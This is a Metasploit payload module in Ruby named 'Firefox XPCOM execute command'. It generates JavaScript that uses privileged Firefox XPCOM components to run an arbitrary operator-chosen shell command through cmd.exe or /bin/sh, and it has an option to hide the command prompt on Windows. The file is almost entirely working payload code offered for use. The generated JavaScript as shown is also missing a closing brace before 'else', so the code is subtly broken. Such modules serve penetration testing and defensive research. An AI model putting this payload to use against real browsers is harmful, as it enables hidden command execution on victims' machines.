##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/firefox'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Firefox

  def initialize(info={})
    super(merge_info(info,
      'Name'          => 'Firefox XPCOM execute command',
      'Description'   => %Q|
        Runs a shell command on the OS. Never touches the disk.

        On Windows, this command will flash the command prompt momentarily.
        You can avoid this by setting WSCRIPT to true, which drops a jscript
        "launcher" to disk that hides the prompt.
      |,
      'Author'        => ['joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'firefox',
      'Arch'          => ARCH_FIREFOX
    ))
    register_options([
      OptString.new('CMD', [true, "The command string to execute", 'touch /tmp/a.txt']),
      OptBool.new('WSCRIPT', [true, "On Windows, drop a vbscript to hide the cmd prompt", false])
    ], self.class)
  end

  def generate
    <<-EOS

      (function(){
        #{read_file_source if datastore['WSCRIPT']}
        #{run_cmd_source if datastore['WSCRIPT']}

        var cmd = (#{JSON.unparse({ :cmd => datastore['CMD'] })}).cmd;
        if (#{datastore['WSCRIPT']} && windows) {
           runCmd(cmd);
        } else {
          var process = Components.classes["@mozilla.org/process/util;1"]
                          .createInstance(Components.interfaces.nsIProcess);
          var sh = Components.classes["@mozilla.org/file/local;1"]
                    .createInstance(Components.interfaces.nsILocalFile);
          var args;
          if (windows) {
            sh.initWithPath("C:\\\\Windows\\\\System32\\\\cmd.exe");
            args = ["/c", cmd];
          else {
            sh.initWithPath("/bin/sh");
            args = ["-c", cmd];
          }
          process.init(sh);
          process.run(true, args, args.length);
        }
      })();

    EOS
  end
end
